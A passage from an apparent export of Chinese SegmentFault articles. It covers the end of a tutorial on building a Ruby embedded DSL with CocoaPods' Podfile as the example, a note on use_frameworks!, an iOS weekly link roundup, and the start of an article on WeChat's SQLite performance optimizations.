<pre><code class=""ruby"">&gt; eval ""1 + 2 * 3""
 =&gt; 7</code></pre>
<p>有了 <code>eval</code> 方法，我们就获得了更加强大的动态能力，在运行时，使用字符串来改变控制流程，执行代码并可以直接利用当前语言的解释器；而不需要去手动解析字符串然后执行代码。</p>
<h4>格式和约定</h4>
<p>编写 Ruby 脚本时并不需要像 Python 一样对代码的格式有着严格的规定，没有对空行、Tab 的要求，完全可以想怎么写就怎么写，这样极大的增加了 DSL 设计的可能性。</p>
<p>同时，在一般情况下，Ruby 在方法调用时并不需要添加括号：</p>
<pre><code class=""ruby"">puts ""Wello World!""
puts(""Hello World!"")</code></pre>
<p>这样减少了 DSL 中的噪音，能够帮助我们更加关心语法以及语义上的设计，降低了使用者出错的可能性。</p>
<p>最后，Ruby 中存在一种特殊的数据格式 <code>Symbol</code>：</p>
<pre><code class=""ruby"">&gt; :symbol.to_s
 =&gt; ""symbol""
&gt; ""symbol"".to_sym
 =&gt; :symbol</code></pre>
<p>Symbol 可以通过 Ruby 中内置的方法与字符串之间无缝转换。那么作为一种字符串的替代品，它的使用也能够降低使用者出错的成本并提升使用体验，我们并不需要去写两边加上引号的字符串，只需要以 <code>:</code> 开头就能创建一个 Symbol 对象。</p>
<h3>Podfile 是什么</h3>
<p>对 Ruby 有了一些了解之后，我们就可以再看一下使用 CocoaPods 的工程中的 Podfile 到底是什么了：</p>
<pre><code class=""ruby"">source 'https://github.com/CocoaPods/Specs.git'

target 'Demo' do
    pod 'Mantle', '~&gt; 1.5.1'
    ...
end</code></pre>
<blockquote>
<p>如果不了解 iOS 开发后者没有使用过 CocoaPods，笔者在这里简单介绍一下这个文件中的一些信息。</p>
<p><code>source</code> 可以看作是存储依赖元信息（包括依赖的对应的  GitHub 地址）的源地址；</p>
<p><code>target</code> 表示需要添加依赖的工程的名字；</p>
<p><code>pod</code> 表示依赖，<code>Mantle</code> 为依赖的框架，后面是版本号。</p>
</blockquote>
<p>上面是一个使用 Podfile 定义依赖的一个例子，不过 Podfile 对约束的描述其实是这样的：</p>
<pre><code class=""ruby"">source('https://github.com/CocoaPods/Specs.git')

target('Demo') do
    pod('Mantle', '~&gt; 1.5.1')
    ...
end</code></pre>
<p>Podfile 中对于约束的描述，其实都可以看作是代码的简写，在解析时会当做 Ruby 代码来执行。</p>
<h3>简单搞个 Embedded DSL</h3>
<p>使用 Ruby 实现嵌入式 DSL 一般需要三个步骤，这里以 CocoaPods 为例进行简单介绍：</p>
<ul>
<li><p>创建一个 Podfile 中“代码”执行的上下文，也就是一些方法；</p></li>
<li><p>读取 Podfile 中的内容到脚本中；</p></li>
<li><p>使用 <code>eval</code> 在上下文中执行 Podfile 中的“代码”；</p></li>
</ul>
<h4>原理</h4>
<p>CocoaPods 对于 DSL 的实现基本上就是我们创建一个 DSL 的过程，定义一系列必要的方法，比如 <code>source</code>、<code>pod</code> 等等，创造一个执行的上下文；然后去读存储 DSL 的文件，并且使用 <code>eval</code> 执行。</p>
<p><strong>信息的传递一般都是通过参数</strong>来进行的，比如：</p>
<pre><code class=""ruby"">source 'https://github.com/CocoaPods/Specs.git'</code></pre>
<p><code>source</code> 方法的参数就是依赖元信息 <code>Specs</code> 的 Git 地址，在 <code>eval</code> 执行时就会被读取到 CocoaPods 中，然后进行分析。</p>
<h4>实现</h4>
<p>下面是一个非常常见的 Podfile 内容：</p>
<pre><code class=""ruby"">source 'http://source.git'
platform :ios, '8.0'

target 'Demo' do
    pod 'AFNetworking'
    pod 'SDWebImage'
    pod 'Masonry'
    pod ""Typeset""
    pod 'BlocksKit'
    pod 'Mantle'
    pod 'IQKeyboardManager'
    pod 'IQDropDownTextField'
end</code></pre>
<p>因为这里的 <code>source</code>、<code>platform</code>、<code>target</code> 以及 <code>pod</code> 都是方法，所以在这里我们需要构建一个包含上述方法的上下文：</p>
<pre><code class=""ruby""># eval_pod.rb
$hash_value = {}

def source(url)
end

def target(target)
end

def platform(platform, version)
end

def pod(pod)
end</code></pre>
<p>使用一个全局变量 <code>hash_value</code> 存储 Podfile 中指定的依赖，并且构建了一个 Podfile 解析脚本的骨架；我们先不去完善这些方法的实现细节，先尝试一下读取 Podfile 中的内容并执行 <code>eval</code> 看看会不会有问题。</p>
<p>在 <code>eval_pod.rb</code> 文件的最下面加入这几行代码：</p>
<pre><code class=""ruby"">content = File.read './Podfile'
eval content
p $hash_value</code></pre>
<p>这里读取了 Podfile 文件中的内容，并把其中的内容当做字符串执行，最后打印 <code>hash_value</code> 的值。</p>
<pre><code class=""bash"">$ ruby eval_pod.rb</code></pre>
<p>运行这段 Ruby 代码虽然并没有什么输出，但是并没有报出任何的错误，接下来我们就可以完善这些方法了：</p>
<pre><code class=""ruby"">def source(url)
    $hash_value['source'] = url
end

def target(target)
    targets = $hash_value['targets']
    targets = [] if targets == nil
    targets &lt;&lt; target
    $hash_value['targets'] = targets
    yield if block_given?
end

def platform(platform, version)
end

def pod(pod)
    pods = $hash_value['pods']
    pods = [] if pods == nil
    pods &lt;&lt; pod
    $hash_value['pods'] = pods
end</code></pre>
<p>在添加了这些方法的实现之后，再次运行脚本就会得到 Podfile 中的依赖信息了，不过这里的实现非常简单的，很多情况都没有处理：</p>
<pre><code class=""bash"">$ ruby eval_pod.rb
{""source""=&gt;""http://source.git"", ""targets""=&gt;[""Demo""], ""pods""=&gt;[""AFNetworking"", ""SDWebImage"", ""Masonry"", ""Typeset"", ""BlocksKit"", ""Mantle"", ""IQKeyboardManager"", ""IQDropDownTextField""]}</code></pre>
<p>不过使用 Ruby 构建一个嵌入式 DSL 的过程大概就是这样，使用语言内建的特性来进行创作，创造出一个在使用时看起来并不像代码的 DSL。</p>
<h2>写在后面</h2>
<p>在最后，笔者想说的是，当我们在某一个领域经常需要解决重复性问题时，可以考虑实现一个 DSL 专门用来解决这些类似的问题。</p>
<p>而使用嵌入式 DSL 来解决这些问题是一个非常好的办法，我们并不需要重新实现解释器，也可以利用宿主语言的抽象能力。</p>
<p>同时，在嵌入式 DSL 扩展了 DSL 的范畴之后，不要纠结于某些东西到底是框架还是领域特定语言，这些都不重要，重要的是，在遇到了某些问题时，我们能否跳出来，使用文中介绍的方法减轻我们的工作量。</p>
<h2>Reference</h2>
<ul>
<li><p><a>No Silver Bullet—Essence and Accidents of Software Engineering</a></p></li>
<li><p><a href=""https://en.wikipedia.org/wiki/Domain-specific_language"" rel=""nofollow noreferrer"">Domain-specific language</a></p></li>
<li><p><a href=""http://martinfowler.com/bliki/DomainSpecificLanguage.html"" rel=""nofollow noreferrer"">DomainSpecificLanguage</a></p></li>
<li><p><a href=""http://taligarsiel.com/Projects/howbrowserswork1.htm"" rel=""nofollow noreferrer"">How browsers work</a></p></li>
</ul>
<h2>其它</h2>
<blockquote>
<p>GitHub Repo：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · GitHub</a></p>
<p>Source: <a href=""http://draveness.me/dsl"" rel=""nofollow noreferrer"">http://draveness.me/dsl</a></p>
</blockquote>

                ", 谈谈 DSL 以及 DSL 的应用（以 CocoaPods 为例）,1531971999,416,1,520,1,1,https://segmentfault.com/a/1190000007094896
85,1,0,6,"
                    
<h3><code>use_frameworks!</code></h3>
<p><code>A、用cocoapods 导入swift 框架 到 swift项目和OC项目都必须要 use_frameworks!</code><br><code>B、使用 dynamic frameworks，必须要在Podfile文件中添加 use_frameworks!</code></p>
<pre><code>(1)如果在Podfile文件里不使用 use_frameworks! 则是会生成相应的 .a文件（静态链接库），通过 static libraries 这个方式来管理pod的代码。   

(2)Linked:libPods-xxx.a包含了其它用pod导入的第三方框架的.a文件。

(3)如果使用了use_frameworks! 则cocoapods 会生成相应的 .frameworks文件（动态链接库：实际内容为 Header + 动态链接库 + 资源文件），使用 dynamic frameworks 来取代 static libraries 方式。   

(4)Linked:Pods_xxx.framework包含了其它用pod导入的第三方框架的.framework文件。</code></pre>
<p><code>use_frameworks! -&gt; dynamic frameworks 方式 -&gt; .framework</code><br><code>#use_frameworks! -&gt; static libraries 方式 -&gt; .a</code></p>
<p>关于Library 和 Framework 可以参考：<br><a href=""http://blog.lanvige.com/2015/01/04/library-vs-framework-in-ios/?utm_source=tuicool&amp;utm_medium=referral"" rel=""nofollow noreferrer"">http://blog.lanvige.com/2015/...</a></p>
<pre><code>(1)swift项目cocoapods 默认 use_frameworks!
(2)OC项目cocoapods 默认 #use_frameworks!</code></pre>
<h4>用cocoapods导入OC框架到swift项目：</h4>
<p>（1）#use_frameworks!   必须创建头文件，在头文件里面 #import ""AFNetworking.h""</p>
<p>（2）use_frameworks!   如果有头文件，在头文件里面 #import ""AFNetworking/AFNetworking.h""，其它swift文件中用到不需要再import；如果没有头文件，则在每个需要用到的swift文件里 import AFNetworking。</p>
<h4>用cocoapods导入swift框架到swift项目：</h4>
<p>（1）必须use_frameworks!</p>
<p>（2）不需要头文件，在需要用到框架的swift文件里 import Alamofire</p>
<h4>用cocoapods导入OC框架到OC项目：</h4>
<p>（1）#use_frameworks! 在需要用到的文件里 #import ""AFNetworking.h""；也可以通过pch文件，用法类似swift中的头文件。</p>
<p>（2）use_frameworks! 与(1)类似，用法上没有区别。</p>
<h4>用cocoapods导入swift框架到OC项目：不考虑</h4>
<h3><code>总结：</code></h3>
<p>（1）用swift项目考虑到会使用 OC 和 swift 两种第三方框架，所以Podfile中使用swift项目默认的 use_frameworks! 更为妥当，并且frameworks动态链接库具有一定的优势。   </p>
<p>（2）可以建立一个Bridge头文件，用来import那些OC框架的.h文件：#import ""xxx/xxx.h""。或者不建头文件，像swift框架一样，直接在需要用到的swift文件中import。</p>

                ", Podfile中的 use_frameworks!,1531972001,274,1,222,1,1,https://segmentfault.com/a/1190000007076865
86,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007021306?w=690&amp;h=295"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""ios"" title=""ios""></span></p>
<p>我有一程序员朋友阿温，92 年，高个子，体型偏瘦，平时不善言辞，比较低调。最近，阿温家小娃出生，让他当了一回公司的热议人物。</p>
<p>事情是这样的，那会儿大家都还在睡午觉，只听阿温一声猝不及防的喊声，接下来便是以迅雷不及掩耳之势跑了出去，留下被惊醒群众一脸懵逼。向来稳重的他，今天如此异常的行为引来了不少同事的关注，群里有人开始调侃是不是预定的 7 到了，也有人说是不是手机刷 iOS 10 砖头了……但事实的真相，在之后的一个小时都没有得到当事人阿温的亲自证实。</p>
<p>「还在高速，结果娃已经……」阿温突然在群里发了言，打破了公司群的宁静。</p>
<p>「儿子比手机先到啊」阿温先生紧接着又发了个言，原来本该 10 月中旬出生的娃，提前来到了这个世界。</p>
<p>「你还惦记着手机- -」测试大妹子忍不住骂道。<br>「儿子生气了，要提前出来……」前端大哥笑着附和。<br>「升级了啊！」移动端小哥为荣升为爸爸的阿温送上恭喜。<br>「阿温，公司 10 后程序员就靠你~」CTO 正儿八经地说着笑话。<br> ……</p>
<p>「可以开个程序员从入门到育儿的课程了」运营妹子也加入了这热闹的讨论，并贴心地抛出了几篇 iOS 入门指南，吓得我的朋友阿温再也不敢在群里发言了。</p>
<p>iPhone7 上市，iOS 10 发布，运营妹子都说了编程要从小娃娃抓起，就顺势接个招，分享一些和 iOS 相关的知识。<strong>本期周刊，内容包括 iOS 的入门知识、进阶演练，并配有系列学习，也为大家整理了在 iOS 开发过程中经常会遇到的问题及解决方法，最后还会和大家分享部分 iOS 开发过程用到的工具，比较齐全的 iOS 汇总资源</strong></p>
<p><strong>(﹁""﹁)希望此时的你已习惯刚升级的 iOS 10~</strong></p>
<h3>iOS day day up</h3>
<p>此部分将和大家分享 iOS 入门及进阶的一些知识，另有 Auto Layout，自定义控件等特辑的学习，希望能让你的 iOS 学习 day day up~</p>
<h4>入门</h4>
<ul>
<li>
<p>戴仓薯 - <a href=""https://segmentfault.com/search?q=%5BiOS+10+day+by+day%5D&amp;type=article&amp;relatedObjectId=1200000002464476"" rel=""nofollow noreferrer"">译丨iOS 10 day by day</a></p>
<ul>
<li><p><a href=""https://segmentfault.com/a/1190000006132788"" rel=""nofollow noreferrer"">Day 1：开发 iMessage 的第三方插件</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006564284"" rel=""nofollow noreferrer"">Day 2：线程竞态检测工具 Thread Sanitizer</a><br>……</p></li>
</ul>
</li>
<li><p>JohnLui - <a href=""https://segmentfault.com/a/1190000002661195"" rel=""nofollow noreferrer"">Auto Layout 使用心得丨（一）初体验</a></p></li>
<li><p>Travis - <a href=""https://segmentfault.com/a/1190000002423661"" rel=""nofollow noreferrer"">浅谈 iOS 版本号</a></p></li>
<li><p>十四 - <a href=""https://segmentfault.com/a/1190000000768605"" rel=""nofollow noreferrer"">iOS 开发——设计模式那点事</a></p></li>
<li><p>Cruise_Chan - <a href=""https://segmentfault.com/a/1190000002400329"" rel=""nofollow noreferrer"">进程间通信 (OSX/iOS)</a></p></li>
<li><p>真烦人 - <a href=""https://segmentfault.com/a/1190000002412930"" rel=""nofollow noreferrer"">IOS 学习笔记——iOS 组件之 UIScrollView 详解</a></p></li>
<li><p>testHs - <a href=""https://segmentfault.com/a/1190000002810312"" rel=""nofollow noreferrer"">Block 我所理解的回调</a></p></li>
<li><p>Ilikewhite - <a href=""https://segmentfault.com/a/1190000000646452"" rel=""nofollow noreferrer"">从此爱上 iOS Autolayout</a></p></li>
</ul>
<h4>进阶</h4>
<ul>
<li><p>微店技术 - <a href=""https://segmentfault.com/a/1190000005732602"" rel=""nofollow noreferrer"">如何打造一个高性能的 Hybrid App</a></p></li>
<li><p>佳敏_朱 - <a href=""https://segmentfault.com/a/1190000005153111"" rel=""nofollow noreferrer"">iOS-MVVM 架构-界面与数据 I/O 逻辑分离的实践</a></p></li>
<li><p>forkong - <a href=""https://segmentfault.com/a/1190000004945692"" rel=""nofollow noreferrer"">使用 Python 开发 iOS 程序</a></p></li>
<li><p>MOsky泽 - <a href=""https://segmentfault.com/a/1190000004857254"" rel=""nofollow noreferrer"">我们把 iOS 的 Cocoa Touch 移植到了 Android</a></p></li>
<li><p>Cruise_Chan - <a href=""https://segmentfault.com/a/1190000002706612"" rel=""nofollow noreferrer"">iOS：ComponentKit 使用总结</a></p></li>
<li><p>koknine - <a href=""https://segmentfault.com/a/1190000003520629"" rel=""nofollow noreferrer"">译丨iOS 快速开发必备</a></p></li>
<li><p>CocoaChina - <a href=""https://segmentfault.com/a/1190000002530163"" rel=""nofollow noreferrer"">iOS 图片缓存库基准对比</a></p></li>
</ul>
<h4>系列学习</h4>
<ul>
<li><p>JohnLui - <a href=""https://segmentfault.com/search?q=Auto+Layout+"" rel=""nofollow noreferrer"">Auto Layout 使用心得</a></p></li>
<li><p>秋刀生鱼片 - <a href=""https://segmentfault.com/search?q=+iOS"" rel=""nofollow noreferrer"">iOS 自定义控件教程</a></p></li>
<li><p>luoyibu  -<a href=""https://segmentfault.com/a/1190000002776279"" rel=""nofollow noreferrer"">iOS 异步图片加载优化与常用开源库分析</a></p></li>
</ul>
<h4>扩展阅读</h4>
<ul>
<li><p>P_Chou - <a href=""https://segmentfault.com/a/1190000004144556"" rel=""nofollow noreferrer"">漫谈 iOS 程序的证书和签名机制</a></p></li>
<li><p>JohnLui - <a href=""https://segmentfault.com/a/1190000002679863"" rel=""nofollow noreferrer"">SwiftNotice 发布——纯 Swift 编写的弹出提示及“菊花会动”库</a></p></li>
<li><p>koknine - <a href=""https://segmentfault.com/a/1190000003694112"" rel=""nofollow noreferrer"">iOS 编写高质量代码</a>、<a href=""https://segmentfault.com/a/1190000003722059"" rel=""nofollow noreferrer"">iOS开发常用细节</a></p></li>
<li><p>技术人攻略 - <a href=""https://segmentfault.com/a/1190000000376518"" rel=""nofollow noreferrer"">技术人攻略访谈十九：iOS 大V养成记</a></p></li>
</ul>
<h3>问题解决篇</h3>
<p>get 了比较基本的 iOS 学习知识，并通过不少实例来巩固了一下基础，但 iOS 开发之路上，还是有那么多坑需要填，以下是社区小伙伴躺枪后吸取教训，并找出的一些解决方式，希望你能够少走弯路，多点成长。</p>
<ul>
<li><p>draveness - <a href=""https://segmentfault.com/a/1190000005056914"" rel=""nofollow noreferrer"">成熟的夜间模式解决方案</a></p></li>
<li><p>skyline75489 - <a href=""https://segmentfault.com/a/1190000004943276"" rel=""nofollow noreferrer"">Objective-C 内存管理——你需要知道的一切</a></p></li>
<li><p>丰俊文 - <a href=""https://segmentfault.com/a/1190000000520755"" rel=""nofollow noreferrer"">细说 iOS 消息推送</a></p></li>
<li><p>秋刀生鱼片 - <a href=""https://segmentfault.com/a/1190000002498637"" rel=""nofollow noreferrer"">怎样降低 iOS 代码耦合性</a></p></li>
<li><p>leejan97 - <a href=""https://segmentfault.com/a/1190000002520583"" rel=""nofollow noreferrer"">Objective-C 属性修饰符 strong 和 copy 的区别</a></p></li>
<li><p>kid143 - <a href=""https://segmentfault.com/a/1190000002401961"" rel=""nofollow noreferrer"">iOS 编程修改系统音量</a></p></li>
<li><p>Curiousity - <a href=""https://segmentfault.com/a/1190000006266276"" rel=""nofollow noreferrer"">iOS 客户端基于 WebP 图片格式的流量优化（上）</a></p></li>
<li><p>shadajin - <a href=""https://segmentfault.com/a/1190000006127431"" rel=""nofollow noreferrer"">iOS/Android 浏览器(h5)及微信中唤起本地APP</a></p></li>
<li><p>firim - <a href=""https://segmentfault.com/a/1190000002711621"" rel=""nofollow noreferrer"">iOS 错误堆栈查找崩溃原因的方法</a></p></li>
<li><p>isteven - <a href=""https://segmentfault.com/a/1190000002933776"" rel=""nofollow noreferrer"">iOS9 HTTP 不能正常使用的解决办法</a></p></li>
</ul>
<h3>工具类及资源汇总</h3>
<p>最后，为你带来了提高效率的工具篇，进一步扩展知识的学习资源汇总，希望能更好地帮助到走在 iOS 开发路上的你~</p>
<h4>工具类</h4>
<ul>
<li><p>JeOam - <a href=""https://segmentfault.com/a/1190000000387082"" rel=""nofollow noreferrer"">iOS 开发：用 Instruments 来检验你的app</a></p></li>
<li><p>大舒 - <a href=""https://segmentfault.com/a/1190000002625560"" rel=""nofollow noreferrer"">ComponentKit：一个功能性的和声明性的 Facebook iOS UI 工具</a></p></li>
<li><p>noodles - <a href=""https://segmentfault.com/a/1190000000454170"" rel=""nofollow noreferrer"">iOS 开发必备的调试利器——七款 Debug 工具推荐</a></p></li>
<li><p>LeanCloud 官方专栏 - <a href=""https://segmentfault.com/a/1190000002568993"" rel=""nofollow noreferrer"">译丨iOS 性能优化：Instruments 工具的救命三招</a></p></li>
</ul>
<h4>资源汇总</h4>
<ul>
<li><p><a href=""https://segmentfault.com/a/1190000002569925"" rel=""nofollow noreferrer"">超齐全丨iOS 学习资料整理</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000002573302"" rel=""nofollow noreferrer"">iOS 学习参考资料</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000002573634"" rel=""nofollow noreferrer"">iOS 学习资料整理（上）</a>、<a href=""https://segmentfault.com/a/1190000002573632"" rel=""nofollow noreferrer"">（下）</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000002473595"" rel=""nofollow noreferrer"">iOS 学习资料整理</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000002665904"" rel=""nofollow noreferrer"">GitHub 上排名前 100 的 Objective-C 项目简介</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000002944692"" rel=""nofollow noreferrer"">GitHub 排名前 50 的 Objective-C 开发者</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000003849085"" rel=""nofollow noreferrer"">盘点国内程序员不常用的热门 iOS 第三方库:看完,还敢自称”精通 iOS 开发”吗?</a></p></li>
</ul>
<p><em>（本期完）</em><br><br></p>
<hr>
<p>往期周刊传送门：</p>
<ul>
<li><p><a href=""https://segmentfault.com/a/1190000006579616"" rel=""nofollow noreferrer"">Vol.1 - Vue.js 起手式</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006690217"" rel=""nofollow noreferrer"">Vol.2 - 666，ES6</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006751300"" rel=""nofollow noreferrer"">Vol.3 - 前后端分离与前端工程化</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006827148"" rel=""nofollow noreferrer"">Vol.4 - 这份 Android 有点甜</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006893394"" rel=""nofollow noreferrer"">Vol.5 - Build, Ship, Run, and Monitor with Docker</a></p></li>
<li><p><a href=""https://segmentfault.com/a/1190000006950447"" rel=""nofollow noreferrer"">Vol.6 - 面试那些事儿</a></p></li>
</ul>
<hr>
<blockquote>
<p><strong># SegmentFault 技术周刊 #</strong></p>
<p>「技术周刊」是社区特别推出的技术内容系列，一周一主题。周刊筛选的每篇内容，是作者的独到见解，踩坑总结和经验分享。</p>
<p>每周二更新，欢迎「<a href=""https://segmentfault.com/blog/weekly"" rel=""nofollow noreferrer"">关注</a>」或者「<a href=""https://segmentfault.com/feeds/blog/weekly"" rel=""nofollow noreferrer"">订阅</a>」。大家也可以在评论处留言自己感兴趣的主题，推荐主题相关的优秀文章。</p>
</blockquote>

                ", SegmentFault 技术周刊 Vol.7 - iOS丨好好学习，从娃抓起~,1531972002,331,1,605,1,1,https://segmentfault.com/a/1190000007021303
87,1,0,6,"
                    
<p>本文来自于<a href=""https://bugly.qq.com/"" rel=""nofollow noreferrer"">腾讯bugly开发者社区</a>，非经作者同意，请勿转载，原文地址：<a href=""http://dev.qq.com/topic/57b58022433221be01499480"" rel=""nofollow noreferrer"">http://dev.qq.com/topic/57b58...</a></p>
<blockquote><p>作者：张三华</p></blockquote>
<h2>前言</h2>
<p>随着微信iOS客户端业务的增长，在数据库上遇到的性能瓶颈也逐渐凸显。在微信的卡顿监控系统上，数据库相关的卡顿不断上升。而在用户侧也逐渐能感知到这种卡顿，尤其是有大量群聊、联系人和消息收发的重度用户。</p>
<p>我们在对SQLite进行优化的过程中发现，靠单纯地修改SQLite的参数配置，已经不能彻底解决问题。因此从6.3.16版本开始，我们合入了SQLite的源码，并开始进行源码层的优化。</p>
<p>本文将分享在SQLite源码上进行的多线程并发、I/O性能优化等，并介绍优化相关的SQLite原理。</p>
<h2>多线程并发优化</h2>
<h4>1. 背景</h4>
<p>由于历史原因，旧版本的微信一直使用单句柄的方案，即所有线程共有一个SQLite Handle，并用线程锁避免多线程问题。当多线程并发时，各线程的数据库操作同步顺序进行，这就导致后来的线程会被阻塞较长的时间。</p>
<h4>2. SQLite的多句柄方案及Busy Retry方案</h4>
<p>SQLite实际是支持多线程（几乎）无锁地并发操作。只需</p>
<ol>
<li><p>开启配置 <code>PRAGMA SQLITE_THREADSAFE=2</code></p></li>
<li><p>确保同一个句柄同一时间只有一个线程在操作</p></li>
</ol>
<blockquote><p><a href=""http://www.sqlite.org/threadsafe.html"" rel=""nofollow noreferrer"">Multi-thread. In this mode, SQLite can be safely used by multiple threads provided that no single database connection is used simultaneously in two or more threads.</a></p></blockquote>
<p>倘若再开启SQLite的WAL模式（Write-Ahead-Log），多线程的并发性将得到进一步的提升。</p>
<p>此时写操作会先append到wal文件末尾，而不是直接覆盖旧数据。而读操作开始时，会记下当前的WAL文件状态，并且只访问在此之前的数据。这就确保了多线程<strong>读与读</strong>、<strong>读与写</strong>之间可以并发地进行。</p>
<p>然而，阻塞的情况并非不会发生。</p>
<ul><li><p>当多线程写操作并发时，后来者还是必须在源码层等待之前的写操作完成后才能继续。</p></li></ul>
<p>SQLite提供了Busy Retry的方案，即发生阻塞时，会触发Busy Handler，此时可以让线程休眠一段时间后，重新尝试操作。重试一定次数依然失败后，则返回<code>SQLITE_BUSY</code>错误码。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006760634"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h4>3. SQLite Busy Retry方案的不足</h4>
<p>Busy Retry的方案虽然基本能解决问题，但对性能的压榨做的不够极致。在Retry过程中，休眠时间的长短和重试次数，是决定性能和操作成功率的关键。</p>
<p>然而，它们的最优值，因不同操作不同场景而不同。若休眠时间太短或重试次数太多，会空耗CPU的资源；若休眠时间过长，会造成等待的时间太长；若重试次数太少，则会降低操作的成功率。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006657599"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""原生方案的不足"" title=""原生方案的不足""></span></p>
<p>我们通过A/B Test对不同的休眠时间进行了测试，得到了如下的结果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006657601"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""成功率曲线"" title=""成功率曲线""></span></p>
<p>可以看到，倘若休眠时间与重试成功率的关系，按照绿色的曲线进行分布，那么p点的值也不失为该方案的一个次优解。然而事总不遂人愿，我们需要一个更好的方案。</p>
<h4>4. SQLite中的线程锁及进程锁</h4>
<p>作为有着十几年发展历史、且被广泛认可的数据库，SQLite的任何方案选择都是有其原因的。在完全理解由来之前，切忌盲目自信、直接上手修改。因此，首先要了解SQLite是如何控制并发的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006657603"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""SQLite架构"" title=""SQLite架构""></span></p>
<p>SQLite是一个适配不同平台的数据库，不仅支持多线程并发，还支持多进程并发。它的核心逻辑可以分为两部分：</p>
<ul>
<li><p>Core层。包括了接口层、编译器和虚拟机。通过接口传入SQL语句，由编译器编译SQL生成虚拟机的操作码opcode。而虚拟机是基于生成的操作码，控制Backend的行为。</p></li>
<li><p>Backend层。由B-Tree、Pager、OS三部分组成，实现了数据库的存取数据的主要逻辑。</p></li>
</ul>
<p>在架构最底端的OS层是对不同操作系统的系统调用的抽象层。它实现了一个VFS（Virtual File System），将OS层的接口在编译时映射到对应操作系统的系统调用。锁的实现也是在这里进行的。</p>
<p>SQLite通过两个锁来控制并发。第一个锁对应DB文件，通过5种状态进行管理；第二个锁对应WAL文件，通过修改一个16-bit的unsigned short int的每一个bit进行管理。尽管锁的逻辑有一些复杂，但此处并不需关心。这两种锁最终都落在OS层的<code>sqlite3OsLock</code>、<code>sqlite3OsUnlock</code>和<code>sqlite3OsShmLock</code>上具体实现。</p>
<p>它们在锁的实现比较类似。以lock操作在iOS上的实现为例：</p>
<ol>
<li><p>通过<code>pthread_mutex_lock</code>进行线程锁，防止其他线程介入。然后比较状态量，若当前状态不可跳转，则返回<code>SQLITE_BUSY</code></p></li>
<li><p>通过<code>fcntl</code>进行文件锁，防止其他进程介入。若锁失败，则返回<code>SQLITE_BUSY</code></p></li>
</ol>
<p>而SQLite选择Busy Retry的方案的原因也正是在此－－－<strong>文件锁没有线程锁类似pthread_cond_signal的通知机制。当一个进程的数据库操作结束时，无法通过锁来第一时间通知到其他进程进行重试。因此只能退而求其次，通过多次休眠来进行尝试。</strong></p>
<h4>5. 新的方案</h4>
<p>通过上面的各种分析、准备，终于可以动手开始修改了。</p>
<p>我们知道，iOS app是单进程的，并<strong>没有多进程并发的需求</strong>，这和SQLite的设计初衷是不相同的。这就给我们的优化提供了理论上的基础。在iOS这一特定场景下，我们可以舍弃兼容性，提高并发性。</p>
<p>新的方案修改为，当OS层进行lock操作时：</p>
<ol>
<li><p>通过<code>pthread_mutex_lock</code>进行线程锁，防止其他线程介入。然后比较状态量，若当前状态不可跳转，则将当前期望跳转的状态，插入到一个FIFO的Queue尾部。最后，线程通过<code>pthread_cond_wait</code>进入 休眠状态，等待其他线程的唤醒。</p></li>
<li><p>忽略文件锁</p></li>
</ol>
<p>当OS层的unlock操作结束后：</p>
<ol><li><p>取出Queue头部的状态量，并比较状态是否能够跳转。若能够跳转，则通过<code>pthread_cond_signal_thread_np</code>唤醒对应的线程重试。</p></li></ol>
<blockquote><p><code>pthread_cond_signal_thread_np</code>是Apple在pthread库中新增的接口，与<code>pthread_cond_signal</code>类似，它能唤醒一个等待条件锁的线程。不同的是，<code>pthread_cond_signal_thread_np</code>可以指定一个特定的线程进行唤醒。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006658378"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""新的方案"" title=""新的方案""></span></p>
<p>新的方案可以在DB空闲时的第一时间，通知到其他正在等待的线程，最大程度地降低了空等待的时间，且准确无误。此外，由于Queue的存在，当主线程被其他线程阻塞时，可以将主线程的操作“插队”到Queue的头部。当其他线程发起唤醒通知时，主线程可以有更高的优先级，从而降低用户可感知的卡顿。</p>
<p>该方案上线后，卡顿检测系统检测到</p>
<ul>
<li><p>等待线程锁的造成的卡顿下降超过90%</p></li>
<li><p>SQLITE_BUSY的发生次数下降超过95%</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006658111"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""等锁卡顿"" title=""等锁卡顿""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006760635"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""朋友圈Busy"" title=""朋友圈Busy""></span></p>
<h2>I/O 性能优化</h2>
<h4>保留WAL文件大小</h4>
<p>如上文多线程优化时提到，开启WAL模式后，写入的数据会先append到WAL文件的末尾。待文件增长到一定长度后，SQLite会进行checkpoint。这个长度默认为1000个页大小，在iOS上约为3.9MB。</p>
